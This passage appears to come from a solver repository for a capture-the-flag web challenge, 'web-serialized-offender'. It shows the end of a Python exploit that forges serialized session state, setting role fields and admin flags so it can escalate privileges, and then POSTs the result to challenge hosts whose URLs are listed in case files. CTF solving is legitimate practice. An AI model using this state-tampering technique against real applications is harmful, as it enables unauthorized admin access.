sample_state\"), dict) else {\"user\": \"analyst\", \"role\": \"analyst\"}\n    role_keys = [k for k in sample if re.search(r\"role\", k, re.I)] or [\"role\"]\n    url = urllib.parse.urljoin(base, route)\n    for role in ROLES:\n        st = dict(sample)\n        for k in role_keys:\n            st[k] = role\n        for flag in (\"is_admin\", \"admin\"):\n            if flag in st:\n                st[flag] = True\n        payload = json.dumps({field: _enc(st, fmt.get(\"encoding\"))}).encode()\n        _, b, _ = websolve.fetch(url, data=payload, method=\"POST\", headers={\"Content-Type\": \"application/json\"})\n        p = websolve.proof(b)\n        if p:\n            return p\n    return None\n\n\nHANDLERS = {\"day26_web_serialized_offender\": exploit}\n--- challenges/day26/web-serialized-offender/solver/cases/auto-mastery-a8fa0819\n{\"attempt\": \"a8fa0819-edfc-4fab-857f-7ca1975e62b0\", \"targets\": [\"https://57ad85770dec2434a055e56cf8aa1880ae06d899d79f07d1.2026.huntress.ctf.games/\", \"https://fd618eab07c2fe064eb707b522fa513bd285cfbc6bb670c6.2026.huntress.ctf.games/\", \"https://aecf957a9ca5b814f71799f141aa8be135f6c4e1ed8e5e45.2026.huntress.ctf.games/\", \"https://c40550a6d010ff66ea8c792f713ce0f5e67f3f06adc8a23d.2026.huntress.ctf.games/\"]}\nchallenges/day26/web-serialized-offender/solver/cases/auto-mastery-a8fa0819/artifacts:\n--- challenges/day26/web-serialized-offender/solver/cases/auto-time_trial-b25e1d05\n{\"attempt\": \"b25e1d05-9c60-491a-bc46-e79e1f0a69e4\", \"targets\": [\"https://c97ca5e51788a96e3140c4978092c3d68d8ee8b521755bc6.2026.huntress.ctf.games/\"]}\nchallenges/day26/web-serialized-offender/solver/cases/auto-time_trial-b25e1d05/artifacts:\n--- challenges/day26/web-serialized-offender/solver/cases/single_solve\n{\"attempt\": \"20839dad-a683-40b4-b1ba-0eb30ad458d2\", \"targets\": [\"https://d4dc8ef6b8b64428ad3be732c4d24799db66eb512ccd1df3.2026.huntress.ctf.games/\"]}\nchallenges/day26/web-serialized-offender/solver/cases/single_solve/artifacts:\n